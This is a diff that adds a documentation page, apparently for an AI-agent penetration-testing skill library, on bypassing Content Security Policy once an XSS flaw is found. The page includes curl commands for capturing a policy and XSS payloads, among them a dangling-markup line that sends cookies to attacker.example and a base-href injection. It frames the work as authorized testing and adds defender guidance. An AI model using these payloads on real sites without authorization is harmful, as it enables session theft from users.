@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: xss-csp-bypass</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>xss-csp-bypass</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when an XSS sink is confirmed but a Content Security Policy</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-xss.html">web-xss</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>curl</td><td>8.5</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Content Security Policy is a second layer that can neuter an XSS sink by blocking inline scripts, but most deployed policies have gaps: overly broad allow-lists, <code>unsafe-inline</code> fallbacks, missing <code>object-src</code>, or trusted scripts with JSONP endpoints. This skill covers analyzing a CSP for bypasses on authorized tests and proving which gaps are real. A strong CSP does not erase the underlying XSS; it only contains it, so the sink finding stands regardless.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Capture the exact CSP from headers and meta tags on every relevant page.</li>
+<li>Parse it directive by directive: <code>script-src</code>, <code>object-src</code>,</li>
+<p><code>base-uri</code>, <code>default-src</code>, <code>frame-src</code>.</p>
+<li>Flag weaknesses: <code>unsafe-inline</code>, <code>unsafe-eval</code>, broad hosts,</li>
+<p>allow-listed CDNs with JSONP, missing directives.</p>
+<li>Test each weakness with a targeted payload in a real browser.</li>
+<li>If no bypass exists, document the CSP as effective containment and keep</li>
+<p>the XSS finding with reduced impact.</p>
+<li>Record the policy text and every tested bypass attempt.</li>
+</ol>
+<h2>1. Capturing and parsing the policy</h2>
+<pre><code class="language-bash"># Get the raw policy from headers
+curl -s -D - &#x27;https://target.example/app&#x27; -o /dev/null | grep -i &#x27;content-security-policy&#x27;
+
+# Check meta-tag policies too (weaker, but they apply)
+curl -s &#x27;https://target.example/app&#x27; | grep -o &#x27;&lt;meta[^&gt;]*Content-Security-Policy[^&gt;]*&gt;&#x27;
+
+# Pretty-print the directives for analysis
+curl -s -D - &#x27;https://target.example/app&#x27; -o /dev/null \
+  | grep -i &#x27;^content-security-policy:&#x27; | tr &#x27;;&#x27; &#x27;\n&#x27;</code></pre>
+<p>Read every directive. Common gaps: no <code>object-src</code> (falls back to <code>default-src</code> or allows plugins), <code>script-src</code> with <code>unsafe-inline</code>, <code>*.example.com</code> wildcards an attacker can claim a subdomain of, and allow-listed script hosts that serve JSONP or open redirects.</p>
+<h2>2. Testing common bypasses</h2>
+<pre><code class="language-bash"># Gap 1: unsafe-inline present -&gt; classic inline payload still works
+# &quot;&gt;&lt;script&gt;console.log(&#x27;csp-inline&#x27;)&lt;/script&gt;
+
+# Gap 2: allow-listed CDN with JSONP endpoint
+# &lt;script src=&quot;https://trusted-cdn.example/jsonp?callback=console.log&quot;&gt;&lt;/script&gt;
+
+# Gap 3: dangling markup exfiltration needs no script execution at all
+# &quot;&gt;&lt;img src=&quot;https://attacker.example/x?cookie=  (unclosed quote steals following content)
+
+# Gap 4: base-uri missing -&gt; inject &lt;base href=&quot;https://attacker.example/&quot;&gt;
+# then relative script URLs load from the attacker
+
+# Gap 5: nonce reuse or predictable nonces
+# fetch two pages, compare nonce values; equal nonces mean replay
+for i in 1 2; do
+  curl -s &#x27;https://target.example/app&#x27; | grep -o &quot;nonce-[^\&quot;&#x27;]*&quot; | head -1
+done</code></pre>
+<p>Test in a real browser with DevTools open: the console logs exactly which directive blocked each attempt, which tells you what to try next.</p>
+<h2>3. Reporting CSP posture honestly</h2>
+<p>A CSP assessment has three honest outcomes, and the report must pick one.</p>
+<pre><code class="language-bash"># Outcome A: bypass found -&gt; XSS keeps full impact, CSP is broken
+# Outcome B: no bypass, policy tight -&gt; XSS contained, impact reduced
+# Outcome C: no CSP at all -&gt; note the missing layer alongside the XSS
+
+# Quick strictness checklist to paste into notes:
+# [ ] script-src without unsafe-inline and without broad hosts
+# [ ] object-src &#x27;none&#x27;
+# [ ] base-uri &#x27;self&#x27; or absent injection point
+# [ ] nonces unique per response (or hashes for static scripts)
+# [ ] report-uri or report-to configured</code></pre>
+<p>Never claim a CSP bypass you did not execute in a browser. Console block messages are evidence of failure, not success.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Multiple policies combine (header plus meta tag). The browser enforces</li>
+<p>the intersection of all policies, so the strictest combination wins; test against the real combined behavior, not one policy in isolation.</p>
+<li><code>report-only</code> policies block nothing. Check the header name:</li>
+<p><code>Content-Security-Policy-Report-Only</code> is monitoring, not enforcement.</p>
+<li>The policy differs between pages. The login page may be strict while the</li>
+<p>vulnerable page is lax; assess the policy on the page with the sink.</p>
+<li>Nonces look random but repeat per session. Compare across sessions and</li>
+<p>users, not just across two requests in one session.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No bypass in the policy: accept containment, keep the XSS finding with</li>
+<p>accurately reduced impact, and recommend policy hardening as defense in depth.</p>
+<li>You suspect a JSONP bypass on an allow-listed host: verify the endpoint</li>
+<p>actually reflects the callback unsafely; many JSONP endpoints were fixed, and an unexploitable allow-list entry is not a bypass.</p>
+<li>The engagement wants a full CSP review: expand to every page and every</li>
+<p>directive, and deliver the strictness checklist as a separate section.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see CSP bypass testing as repeated page loads with odd script URLs and fragment probes, plus <code>report-uri</code> violation reports if reporting is configured (which is itself useful telemetry). A bypass that succeeds shows as script execution the policy should have stopped. Durable defense is a strict policy: nonces or hashes for scripts, <code>object-src &#x27;none&#x27;</code>, <code>base-uri &#x27;self&#x27;</code>, no broad allow-lists, and violation reporting wired into the SOC.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-79 (Improper Neutralization of Input During Web Page Generation,</li>
+<p>Cross-site Scripting).</p>
+<li>OWASP Content Security Policy Cheat Sheet.</li>
+<li>PortSwigger Web Security Academy: CSP bypass labs.</li>
+<li>Content Security Policy Level 3 specification (W3C).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
